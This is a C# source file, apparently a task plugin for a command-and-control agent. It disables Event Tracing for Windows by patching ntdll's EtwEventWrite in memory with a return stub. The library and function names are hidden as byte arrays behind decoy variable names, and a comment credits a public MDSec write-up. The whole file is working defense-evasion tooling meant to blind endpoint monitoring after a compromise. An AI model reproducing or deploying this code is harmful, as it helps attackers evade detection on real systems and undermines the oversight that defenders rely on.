using PluginBase;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Plugin
{
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    public static class etw
    {
        //Credit to code goes to Adeam Chester @_xpn_ - https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
        //https://twitter.com/_xpn_

        public static ResponseResult Execute(Dictionary<string, object> args)
        {
            try
            {
                if (Environment.Is64BitProcess)
                {
                    if (SpearAndShield(new byte[] { 0x48, 0x33, 0xC0, 0xC3 }))
                    {
                        return new ResponseResult
                        {
                            completed = "true",
                            user_output = "Success",
                            task_id = (string)args["task-id"],
                        };
                    }
                }
                else
                {
                    if (SpearAndShield(new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 }))
                    {
                        return new ResponseResult
                        {
                            completed = "true",
                            user_output = "Success",
                            task_id = (string)args["task-id"],
                        };
                    }
                }
                return new ResponseResult
                {
                    completed = "true",
                    user_output = "Failed",
                    task_id = (string)args["task-id"],
                    status = "error"
                };

            }
            catch (Exception e)
            {
                //oh no an error
                return new ResponseResult
                {
                    completed = "true",
                    user_output = e.Message,
                    task_id = (string)args["task-id"],
                    status = "error"
                };
            }
        }
        private static bool SpearAndShield(byte[] bSpear)
        {
            try
            {
                uint uCape;
                byte[] bSword = new byte[] { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c };
                var pShield = Win32.LoadLibrary(Encoding.ASCII.GetString(bSword));

                byte[] bShield = new byte[] { 0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65 };
                var pMail = Win32.GetProcAddress(pShield, Encoding.ASCII.GetString(bShield));

                Win32.VirtualProtect(pMail, (UIntPtr)bSpear.Length, 0x40, out uCape);
                Marshal.Copy(bSpear, 0, pMail, bSpear.Length);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }

}
